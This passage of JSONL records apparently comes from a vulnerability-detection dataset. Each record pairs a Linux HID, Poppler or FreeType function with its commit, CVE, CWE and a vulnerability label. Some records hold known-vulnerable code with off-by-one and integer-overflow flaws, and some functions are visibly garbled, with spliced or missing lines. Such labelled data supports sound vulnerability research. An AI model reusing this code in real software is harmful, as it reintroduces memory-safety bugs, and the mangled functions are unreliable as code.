raw_data+1, size-1);\n\t} else if (report->id == REPORT_IR_DATA) {\n\t\tret = picolcd_raw_cir(data, report, raw_data+1, size-1);\n\t} else {\n\t\tspin_lock_irqsave(&data->lock, flags);\n\t\t/*\n\t\t * We let the caller of picolcd_send_and_wait() check if the\n\t\t * report we got is one of the expected ones or not.\n\t\t */\n\t\tif (data->pending) {\n\t\t\tmemcpy(data->pending->raw_data, raw_data+1, size-1);\n\t\t\tdata->pending->raw_size  = size-1;\n\t\t\tdata->pending->in_report = report;\n\t\t\tcomplete(&data->pending->ready);\n\t\t}\n\t\tspin_unlock_irqrestore(&data->lock, flags);\n\t}\n\n\tpicolcd_debug_raw_event(data, hdev, report, raw_data, size);\n\treturn 1;\n}\n", "func_hash": 336846250312050028232066323392072383213, "file_name": "hid-picolcd_core.c", "file_hash": 186782659027372809911748564926739155996, "cwe": ["CWE-119"], "cve": "CVE-2014-3186", "cve_desc": "Buffer overflow in the picolcd_raw_event function in devices/hid/hid-picolcd_core.c in the PicoLCD HID device driver in the Linux kernel through 3.16.3, as used in Android on Nexus 7 devices, allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that sends a large report.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3186"}
{"idx": 1290, "project": "linux", "commit_id": "4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "commit_message": "HID: fix a couple of off-by-ones\n\nThere are a few very theoretical off-by-one bugs in report descriptor size\nchecking when performing a pre-parsing fixup. Fix those.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 1, "func": " static __u8 *ch_report_fixup(struct hid_device *hdev, __u8 *rdesc,\n \t\tunsigned int *rsize)\n {\n\tif (*rsize >= 17 && rdesc[11] == 0x3c && rdesc[12] == 0x02) {\n \t\thid_info(hdev, \"fixing up Cherry Cymotion report descriptor\\n\");\n \t\trdesc[11] = rdesc[16] = 0xff;\n \t\trdesc[12] = rdesc[17] = 0x03;\n\t}\n\treturn rdesc;\n}\n", "func_hash": 45538586871323178624538960674889390064, "file_name": "hid-cherry.c", "file_hash": 187455207934208845636828150080769233950, "cwe": ["CWE-119"], "cve": "CVE-2014-3184", "cve_desc": "The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3184"}
{"idx": 1291, "project": "linux", "commit_id": "4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "commit_message": "HID: fix a couple of off-by-ones\n\nThere are a few very theoretical off-by-one bugs in report descriptor size\nchecking when performing a pre-parsing fixup. Fix those.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 1, "func": "static __u8 *kye_report_fixup(struct hid_device *hdev, __u8 *rdesc,\n\t\tunsigned int *rsize)\n{\n\tswitch (hdev->product) {\n\tcase USB_DEVICE_ID_KYE_ERGO_525V:\n\t\t/* the fixups that need to be done:\n\t\t *   - change led usage page to button for extra buttons\n\t\t *   - report size 8 count 1 must be size 1 count 8 for button\n\t\t *     bitfield\n \t\t *   - change the button usage range to 4-7 for the extra\n \t\t *     buttons\n \t\t */\n\t\tif (*rsize >= 74 &&\n \t\t\trdesc[61] == 0x05 && rdesc[62] == 0x08 &&\n \t\t\trdesc[63] == 0x19 && rdesc[64] == 0x08 &&\n \t\t\trdesc[65] == 0x29 && rdesc[66] == 0x0f &&\n\t\t\trdesc[71] == 0x75 && rdesc[72] == 0x08 &&\n\t\t\trdesc[73] == 0x95 && rdesc[74] == 0x01) {\n\t\t\thid_info(hdev,\n\t\t\t\t \"fixing up Kye/Genius Ergo Mouse \"\n\t\t\t\t \"report descriptor\\n\");\n\t\t\trdesc[62] = 0x09;\n\t\t\trdesc[64] = 0x04;\n\t\t\trdesc[66] = 0x07;\n\t\t\trdesc[72] = 0x01;\n\t\t\trdesc[74] = 0x08;\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_KYE_EASYPEN_I405X:\n\t\tif (*rsize == EASYPEN_I405X_RDESC_ORIG_SIZE) {\n\t\t\trdesc = easypen_i405x_rdesc_fixed;\n\t\t\t*rsize = sizeof(easypen_i405x_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_KYE_MOUSEPEN_I608X:\n\t\tif (*rsize == MOUSEPEN_I608X_RDESC_ORIG_SIZE) {\n\t\t\trdesc = mousepen_i608x_rdesc_fixed;\n\t\t\t*rsize = sizeof(mousepen_i608x_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_KYE_EASYPEN_M610X:\n\t\tif (*rsize == EASYPEN_M610X_RDESC_ORIG_SIZE) {\n\t\t\trdesc = easypen_m610x_rdesc_fixed;\n\t\t\t*rsize = sizeof(easypen_m610x_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\tcase USB_DEVICE_ID_GENIUS_GILA_GAMING_MOUSE:\n\t\trdesc = kye_consumer_control_fixup(hdev, rdesc, rsize, 104,\n\t\t\t\t\t\"Genius Gila Gaming Mouse\");\n\t\tbreak;\n\tcase USB_DEVICE_ID_GENIUS_GX_IMPERATOR:\n\t\trdesc = kye_consumer_control_fixup(hdev, rdesc, rsize, 83,\n\t\t\t\t\t\"Genius Gx Imperator Keyboard\");\n\t\tbreak;\n\tcase USB_DEVICE_ID_GENIUS_MANTICORE:\n\t\trdesc = kye_consumer_control_fixup(hdev, rdesc, rsize, 104,\n\t\t\t\t\t\"Genius Manticore Keyboard\");\n\t\tbreak;\n\t}\n\treturn rdesc;\n}\n", "func_hash": 61701421720071808882903110031752917362, "file_name": "hid-kye.c", "file_hash": 236592989497276142238000662973665272399, "cwe": ["CWE-119"], "cve": "CVE-2014-3184", "cve_desc": "The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3184"}
{"idx": 1292, "project": "linux", "commit_id": "4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/4ab25786c87eb20857bbb715c3ae34ec8fd6a214", "commit_message": "HID: fix a couple of off-by-ones\n\nThere are a few very theoretical off-by-one bugs in report descriptor size\nchecking when performing a pre-parsing fixup. Fix those.\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>", "target": 1, "func": "static __u8 *lg_report_fixup(struct hid_device *hdev, __u8 *rdesc,\n\t\tunsigned int *rsize)\n{\n\tstruct lg_drv_data *drv_data = hid_get_drvdata(hdev);\n \tstruct usb_device_descriptor *udesc;\n \t__u16 bcdDevice, rev_maj, rev_min;\n \n\tif ((drv_data->quirks & LG_RDESC) && *rsize >= 90 && rdesc[83] == 0x26 &&\n \t\t\trdesc[84] == 0x8c && rdesc[85] == 0x02) {\n \t\thid_info(hdev,\n \t\t\t \"fixing up Logitech keyboard report descriptor\\n\");\n \t\trdesc[84] = rdesc[89] = 0x4d;\n \t\trdesc[85] = rdesc[90] = 0x10;\n \t}\n\tif ((drv_data->quirks & LG_RDESC_REL_ABS) && *rsize >= 50 &&\n \t\t\trdesc[32] == 0x81 && rdesc[33] == 0x06 &&\n \t\t\trdesc[49] == 0x81 && rdesc[50] == 0x06) {\n \t\thid_info(hdev,\n\t\t\t \"fixing up rel/abs in Logitech report descriptor\\n\");\n\t\trdesc[33] = rdesc[50] = 0x02;\n\t}\n\n\tswitch (hdev->product) {\n\n\t/* Several wheels report as this id when operating in emulation mode. */\n\tcase USB_DEVICE_ID_LOGITECH_WHEEL:\n\t\tudesc = &(hid_to_usb_dev(hdev)->descriptor);\n\t\tif (!udesc) {\n\t\t\thid_err(hdev, \"NULL USB device descriptor\\n\");\n\t\t\tbreak;\n\t\t}\n\t\tbcdDevice = le16_to_cpu(udesc->bcdDevice);\n\t\trev_maj = bcdDevice >> 8;\n\t\trev_min = bcdDevice & 0xff;\n\n\t\t/* Update the report descriptor for only the Driving Force wheel */\n\t\tif (rev_maj == 1 && rev_min == 2 &&\n\t\t\t\t*rsize == DF_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Driving Force report descriptor\\n\");\n\t\t\trdesc = df_rdesc_fixed;\n\t\t\t*rsize = sizeof(df_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_MOMO_WHEEL:\n\t\tif (*rsize == MOMO_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Momo Force (Red) report descriptor\\n\");\n\t\t\trdesc = momo_rdesc_fixed;\n\t\t\t*rsize = sizeof(momo_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_MOMO_WHEEL2:\n\t\tif (*rsize == MOMO2_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Momo Racing Force (Black) report descriptor\\n\");\n\t\t\trdesc = momo2_rdesc_fixed;\n\t\t\t*rsize = sizeof(momo2_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_VIBRATION_WHEEL:\n\t\tif (*rsize == FV_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Formula Vibration report descriptor\\n\");\n\t\t\trdesc = fv_rdesc_fixed;\n\t\t\t*rsize = sizeof(fv_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_DFP_WHEEL:\n\t\tif (*rsize == DFP_RDESC_ORIG_SIZE) {\n\t\t\thid_info(hdev,\n\t\t\t\t\"fixing up Logitech Driving Force Pro report descriptor\\n\");\n\t\t\trdesc = dfp_rdesc_fixed;\n\t\t\t*rsize = sizeof(dfp_rdesc_fixed);\n\t\t}\n\t\tbreak;\n\n\tcase USB_DEVICE_ID_LOGITECH_WII_WHEEL:\n\t\tif (*rsize >= 101 && rdesc[41] == 0x95 && rdesc[42] == 0x0B &&\n\t\t\t\trdesc[47] == 0x05 && rdesc[48] == 0x09) {\n\t\t\thid_info(hdev, \"fixing up Logitech Speed Force Wireless report descriptor\\n\");\n\t\t\trdesc[41] = 0x05;\n\t\t\trdesc[42] = 0x09;\n\t\t\trdesc[47] = 0x95;\n\t\t\trdesc[48] = 0x0B;\n\t\t}\n\t\tbreak;\n\t}\n\n\treturn rdesc;\n}\n", "func_hash": 279704939167865611128772246993871300695, "file_name": "hid-lg.c", "file_hash": 90537780722919720067199362868331773823, "cwe": ["CWE-119"], "cve": "CVE-2014-3184", "cve_desc": "The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3184"}
{"idx": 157883, "project": "poppler", "commit_id": "284a92899602daa4a7f429e61849e794569310b5", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=284a92899602daa4a7f429e61849e794569310b5", "commit_message": "Did a mistake in the gmalloc -> gmallocn commit, it's a 4 here not a 3", "target": 0, "func": "void SplashOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashColorMode srcMode;\n  SplashImageSource src;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = maskColors;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n       }\n       break;\n     case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n      break;\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  src = maskColors ? &alphaImageSrc : &imageSrc;\n  splash->drawImage(src, &imgData, srcMode, maskColors ? gTrue : gFalse,\n\t\t    width, height, mat);\n  if (inlineImg) {\n    while (imgData.y < height) {\n      imgData.imgStr->getLine();\n      ++imgData.y;\n    }\n  }\n\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}\n", "func_hash": 238370966634441304873792337937568791030, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 157884, "project": "poppler", "commit_id": "7b2d314a61fd0e12f47c62996cb49ec0d1ba747a", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=7b2d314a61fd0e12f47c62996cb49ec0d1ba747a", "commit_message": "Be paranoid, use gmallocn or gmallocn3 in all gmalloc with *", "target": 0, "func": "void ArthurOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg)\n{\n  unsigned char *buffer;\n  unsigned int *dest;\n  int x, y;\n  ImageStream *imgStr;\n  Guchar *pix;\n  int i;\n  double *ctm;\n   QMatrix matrix;\n   int is_identity_transform;\n   \n  buffer = (unsigned char *)gmallocn3(width, height, 4);\n \n   /* TODO: Do we want to cache these? */\n   imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t  ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  if (maskColors) {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n\n      for (x = 0; x < width; x++) {\n\tfor (i = 0; i < colorMap->getNumPixelComps(); ++i) {\n\t  \n\t  if (pix[i] < maskColors[2*i] * 255||\n\t      pix[i] > maskColors[2*i+1] * 255) {\n\t    *dest = *dest | 0xff000000;\n\t    break;\n\t  }\n\t}\n\tpix += colorMap->getNumPixelComps();\n\tdest++;\n      }\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_ARGB32);\n  }\n  else {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_RGB32);\n  }\n\n  if (m_image == NULL || m_image->isNull()) {\n    qDebug() << \"Null image\";\n    delete imgStr;\n    return;\n  }\n  ctm = state->getCTM();\n  matrix.setMatrix(ctm[0] / width, ctm[1] / width, -ctm[2] / height, -ctm[3] / height, ctm[2] + ctm[4], ctm[3] + ctm[5]);\n\n  m_painter->setMatrix(matrix, true);\n  m_painter->drawImage( QPoint(0,0), *m_image );\n  delete m_image;\n  m_image = 0;\n  free (buffer);\n  delete imgStr;\n\n}\n", "func_hash": 328681969473388669211085267743237662516, "file_name": "ArthurOutputDev.cc", "file_hash": 133699823881014817245493355011253562709, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 157983, "project": "savannah", "commit_id": "79972af4f0485a11dcb19551356c45245749fc5b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=79972af4f0485a11dcb19551356c45245749fc5b", "commit_message": "None", "target": 0, "func": "  ft_smooth_render_generic( FT_Renderer       render,\n                            FT_GlyphSlot      slot,\n                            FT_Render_Mode    mode,\n                            const FT_Vector*  origin,\n                            FT_Render_Mode    required_mode )\n  {\n    FT_Error     error;\n    FT_Outline*  outline = NULL;\n    FT_BBox      cbox;\n    FT_UInt      width, height, height_org, width_org, pitch;\n    FT_Bitmap*   bitmap;\n    FT_Memory    memory;\n    FT_Int       hmul = mode == FT_RENDER_MODE_LCD;\n    FT_Int       vmul = mode == FT_RENDER_MODE_LCD_V;\n    FT_Pos       x_shift, y_shift, x_left, y_top;\n\n    FT_Raster_Params  params;\n\n\n    /* check glyph image format */\n    if ( slot->format != render->glyph_format )\n    {\n      error = Smooth_Err_Invalid_Argument;\n      goto Exit;\n    }\n\n    /* check mode */\n    if ( mode != required_mode )\n      return Smooth_Err_Cannot_Render_Glyph;\n\n    outline = &slot->outline;\n\n    /* translate the outline to the new origin if needed */\n    if ( origin )\n      FT_Outline_Translate( outline, origin->x, origin->y );\n\n    /* compute the control box, and grid fit it */\n    FT_Outline_Get_CBox( outline, &cbox );\n\n    cbox.xMin = FT_PIX_FLOOR( cbox.xMin );\n    cbox.yMin = FT_PIX_FLOOR( cbox.yMin );\n    cbox.xMax = FT_PIX_CEIL( cbox.xMax );\n    cbox.yMax = FT_PIX_CEIL( cbox.yMax );\n\n    width  = (FT_UInt)( ( cbox.xMax - cbox.xMin ) >> 6 );\n    height = (FT_UInt)( ( cbox.yMax - cbox.yMin ) >> 6 );\n    bitmap = &slot->bitmap;\n    memory = render->root.memory;\n\n    width_org  = width;\n    height_org = height;\n\n    /* release old bitmap buffer */\n    if ( slot->internal->flags & FT_GLYPH_OWN_BITMAP )\n    {\n      FT_FREE( bitmap->buffer );\n       slot->internal->flags &= ~FT_GLYPH_OWN_BITMAP;\n     }\n \n    /* allocate new one */\n     pitch = width;\n     if ( hmul )\n     {\n      width = width * 3;\n      pitch = FT_PAD_CEIL( width, 4 );\n    }\n\n    if ( vmul )\n      height *= 3;\n\n    x_shift = (FT_Int) cbox.xMin;\n    y_shift = (FT_Int) cbox.yMin;\n    x_left  = (FT_Int)( cbox.xMin >> 6 );\n    y_top   = (FT_Int)( cbox.yMax >> 6 );\n\n#ifdef FT_CONFIG_OPTION_SUBPIXEL_RENDERING\n\n    if ( slot->library->lcd_filter_func )\n    {\n      FT_Int  extra = slot->library->lcd_extra;\n\n\n      if ( hmul )\n      {\n        x_shift -= 64 * ( extra >> 1 );\n        width   += 3 * extra;\n        pitch    = FT_PAD_CEIL( width, 4 );\n        x_left  -= extra >> 1;\n      }\n\n      if ( vmul )\n      {\n        y_shift -= 64 * ( extra >> 1 );\n        height  += 3 * extra;\n        y_top   += extra >> 1;\n      }\n    }\n \n #endif\n \n    if ( pitch > 0xFFFF || height > 0xFFFF )\n    {\n      FT_ERROR(( \"ft_smooth_render_generic: glyph too large: %d x %d\\n\",\n                 width, height ));\n      return Smooth_Err_Raster_Overflow;\n    }\n\n     bitmap->pixel_mode = FT_PIXEL_MODE_GRAY;\n     bitmap->num_grays  = 256;\n     bitmap->width      = width;\n      goto Exit;\n\n    slot->internal->flags |= FT_GLYPH_OWN_BITMAP;\n\n    /* set up parameters */\n    params.target = bitmap;\n    params.source = outline;\n    params.flags  = FT_RASTER_FLAG_AA;\n\n#ifdef FT_CONFIG_OPTION_SUBPIXEL_RENDERING\n\n    /* implode outline if needed */\n    {\n      FT_Vector*  points     = outline->points;\n      FT_Vector*  points_end = points + outline->n_points;\n      FT_Vector*  vec;\n\n\n      if ( hmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->x *= 3;\n\n      if ( vmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->y *= 3;\n    }\n\n    /* render outline into the bitmap */\n    error = render->raster_render( render->raster, &params );\n\n    /* deflate outline if needed */\n    {\n      FT_Vector*  points     = outline->points;\n      FT_Vector*  points_end = points + outline->n_points;\n      FT_Vector*  vec;\n\n\n      if ( hmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->x /= 3;\n\n      if ( vmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->y /= 3;\n    }\n\n    if ( slot->library->lcd_filter_func )\n      slot->library->lcd_filter_func( bitmap, mode, slot->library );\n\n#else /* !FT_CONFIG_OPTION_SUBPIXEL_RENDERING */\n\n    /* render outline into bitmap */\n    error = render->raster_render( render->raster, &params );\n\n    /* expand it horizontally */\n    if ( hmul )\n    {\n      FT_Byte*  line = bitmap->buffer;\n      FT_UInt   hh;\n\n\n      for ( hh = height_org; hh > 0; hh--, line += pitch )\n      {\n        FT_UInt   xx;\n        FT_Byte*  end = line + width;\n\n\n        for ( xx = width_org; xx > 0; xx-- )\n        {\n          FT_UInt  pixel = line[xx-1];\n\n\n          end[-3] = (FT_Byte)pixel;\n          end[-2] = (FT_Byte)pixel;\n          end[-1] = (FT_Byte)pixel;\n          end    -= 3;\n        }\n      }\n    }\n\n    /* expand it vertically */\n    if ( vmul )\n    {\n      FT_Byte*  read  = bitmap->buffer + ( height - height_org ) * pitch;\n      FT_Byte*  write = bitmap->buffer;\n      FT_UInt   hh;\n\n\n      for ( hh = height_org; hh > 0; hh-- )\n      {\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n        read  += pitch;\n      }\n    }\n\n#endif /* !FT_CONFIG_OPTION_SUBPIXEL_RENDERING */\n\n    FT_Outline_Translate( outline, x_shift, y_shift );\n\n    if ( error )\n      goto Exit;\n\n    slot->format      = FT_GLYPH_FORMAT_BITMAP;\n    slot->bitmap_left = x_left;\n    slot->bitmap_top  = y_top;\n\n  Exit:\n    if ( outline && origin )\n      FT_Outline_Translate( outline, -origin->x, -origin->y );\n\n    return error;\n  }\n", "func_hash": 121084197922462569728293725733145369116, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-0946", "cve_desc": "Multiple integer overflows in FreeType 2.3.9 and earlier allow remote attackers to execute arbitrary code via vectors related to large values in certain inputs in (1) smooth/ftsmooth.c, (2) sfnt/ttcmap.c, and (3) cff/cffload.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0946"}
{"idx": 157984, "project": "savannah", "commit_id": "0545ec1ca36b27cb928128870a83e5f668980bc5", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0545ec1ca36b27cb928128870a83e5f668980bc5", "commit_message": "None", "target": 0, "func": "  cff_charset_load( CFF_Charset  charset,\n                    FT_UInt      num_glyphs,\n                    FT_Stream    stream,\n                    FT_ULong     base_offset,\n                    FT_ULong     offset,\n                    FT_Bool      invert )\n  {\n    FT_Memory  memory = stream->memory;\n    FT_Error   error  = CFF_Err_Ok;\n    FT_UShort  glyph_sid;\n\n\n    /* If the the offset is greater than 2, we have to parse the */\n    /* charset table.                                            */\n    if ( offset > 2 )\n    {\n      FT_UInt  j;\n\n\n      charset->offset = base_offset + offset;\n\n      /* Get the format of the table. */\n      if ( FT_STREAM_SEEK( charset->offset ) ||\n           FT_READ_BYTE( charset->format )   )\n        goto Exit;\n\n      /* Allocate memory for sids. */\n      if ( FT_NEW_ARRAY( charset->sids, num_glyphs ) )\n        goto Exit;\n\n      /* assign the .notdef glyph */\n      charset->sids[0] = 0;\n\n      switch ( charset->format )\n      {\n      case 0:\n        if ( num_glyphs > 0 )\n        {\n          if ( FT_FRAME_ENTER( ( num_glyphs - 1 ) * 2 ) )\n             goto Exit;\n \n           for ( j = 1; j < num_glyphs; j++ )\n          {\n            FT_UShort sid = FT_GET_USHORT();\n\n\n            /* this constant is given in the CFF specification */\n            if ( sid < 65000 )\n              charset->sids[j] = sid;\n            else\n            {\n              FT_ERROR(( \"cff_charset_load:\"\n                         \" invalid SID value %d set to zero\\n\", sid ));\n              charset->sids[j] = 0;\n            }\n          }\n \n           FT_FRAME_EXIT();\n         }\n            /* Read the first glyph sid of the range. */\n            if ( FT_READ_USHORT( glyph_sid ) )\n              goto Exit;\n\n            /* Read the number of glyphs in the range.  */\n            if ( charset->format == 2 )\n            {\n              if ( FT_READ_USHORT( nleft ) )\n                goto Exit;\n            }\n            else\n            {\n              if ( FT_READ_BYTE( nleft ) )\n                goto Exit;\n            }\n\n            /* Fill in the range of sids -- `nleft + 1' glyphs. */\n            for ( i = 0; j < num_glyphs && i <= nleft; i++, j++, glyph_sid++ )\n              charset->sids[j] = glyph_sid;\n          }\n        }\n        break;\n\n      default:\n        FT_ERROR(( \"cff_charset_load: invalid table format!\\n\" ));\n        error = CFF_Err_Invalid_File_Format;\n                 goto Exit;\n             }\n", "func_hash": 274463663087246387196979578674863690828, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-0946", "cve_desc": "Multiple integer overflows in FreeType 2.3.9 and earlier allow remote attackers to execute arbitrary code via vectors related to large values in certain 